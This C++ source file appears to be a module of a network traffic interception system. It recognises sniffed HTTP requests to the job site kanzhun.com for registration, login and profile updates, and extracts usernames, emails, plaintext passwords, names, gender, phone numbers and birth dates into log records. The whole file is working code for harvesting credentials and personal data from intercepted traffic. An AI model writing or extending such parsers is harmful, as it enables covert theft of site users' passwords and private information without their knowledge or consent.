#include "StdAfx.h"
#include "EmployKanZhunWang.h"

employ::KanZhunWang::KanZhunWang(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "看准网";
}

employ::KanZhunWang::~KanZhunWang()
{
	
}

int employ::KanZhunWang::IsKanZhunWang(HttpSession *http_session)
{
	//注册(邮箱注册)
	if((http_session->m_Requestline.m_Host.Find("www.kanzhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/register/doregister")!=-1) )
	{
		return kPcWebRegisterEmail;
	}
	//登录
	if((http_session->m_Requestline.m_Host.Find("www.kanzhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login.json")!=-1) )
	{
		return kPcWebLogin;
	}
	//修改个人信息
	if((http_session->m_Requestline.m_Host.Find("www.kanzhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/update/basic.json")!=-1) )
	{
		return kPCWebModiy;
	}
	return 0;
}

int employ::KanZhunWang::Process(const char *packet,int action)
{
	//注册(邮箱注册)  
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//修改基本信息
	if (action==kPCWebModiy)
	{
		return PCWebModiy(packet);
	}
	return 1;
}

//注册(邮箱注册)
int employ::KanZhunWang::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//昵称
	string username = ms_->GetValueFromMapByKey("username",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("account",true);
	//密码
	string pass = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || email.empty() || pass.empty())
	{
		return 0;
	}

	output_text_ =
		"user=" + 	username + "\r\n" +	//账号		
		"mid=" + 	email + "\r\n" + 	//邮箱		 	
		"pass=" + 	pass + "\r\n" + 	//密码	
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=注册\r\n";
	WriteIndexFile();
	return 1;
}

//登录
int employ::KanZhunWang::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
    string UserName = ms_->GetValueFromMapByKey("account",true);
	//密码
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//账号		
		"pass=" + Password + "\r\n" + 	//密码
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

//修改基本信息
int employ::KanZhunWang::PCWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//姓名
	string name = ms_->GetValueFromMapByKey("name",true);
	//性别
	string gender = ms_->GetValueFromMapByKey("gender",true);
	if (gender=="1")
	{
		gender = "男";
	}
	if (gender =="2")
	{
		gender = "女";
	}
	//手机号
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("email",true);
	//出生日期
	string birth = ms_->GetValueFromMapByKey("birthdayYear",true) + "-" + 
					ms_->GetValueFromMapByKey("birthdayMonth",true) + "-" + 
					ms_->GetValueFromMapByKey("birthdayDay",true);

	if (name.empty() || gender.empty() || mobile.empty() || email.empty() || birth.empty())
	{
		return 0;
	}
	output_text_=
		"servername=" + name + "\r\n" + 	//姓名	        
		"sex=" + 	  	gender + "\r\n" + 	//性别	
		"msg=" + 	  	birth + "\r\n" + 	//出生日期	
		"oid=" + 	  	mobile + "\r\n" + 	//手机号	
		"mid=" + 	  	email + "\r\n" + 	//邮箱	
		"netmark=" + app_ + "\r\n" + 		//来源
		"state=修改基本信息\r\n";  
	WriteIndexFile();
	return 1;
}